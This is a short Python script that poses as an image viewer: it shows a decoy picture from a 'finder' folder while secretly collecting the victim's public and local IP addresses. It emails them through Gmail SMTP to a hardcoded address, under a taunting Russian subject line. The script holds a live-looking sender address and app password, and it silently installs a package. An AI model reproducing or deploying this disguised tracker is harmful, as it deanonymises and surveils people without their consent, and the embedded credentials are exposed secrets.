from os import popen, system, getcwd
system("pip install Pillow")

from PIL import Image
from smtplib import SMTP
from email.mime.text import MIMEText

def shape():
  try: myhtml = f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>"""
  except: myhtml = "ERROR :("
  finally:
    sender = "7kipgod@gmail.com"
    destination = "svaller22@gmail.com" # !!! enter where to send the message
    application_passwords = "eifjuipuczaxguxb"
    # !!! create a password using the link for the sender's email : https://myaccount.google.com/security#:~:text=%EE%97%8C-,%D0%9F%D0%B0%D1%80%D0%BE%D0%BB%D0%B8%20%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B9,-%D0%9D%D0%B8%20%D0%BE%D0%B4%D0%BD%D0%BE%D0%B3%D0%BE
    msg = MIMEText(myhtml,"html")
    msg["Subject"] = f"Попался, который кусался! {popen('date').read()}"
    msg['From'] = sender
    msg['To'] = destination

    server = SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, application_passwords)
    server.sendmail(sender, destination, msg.as_string())

if __name__ == "__main__": 
  Image.open(f"{getcwd()}/finder/image.jpeg").show()
  shape()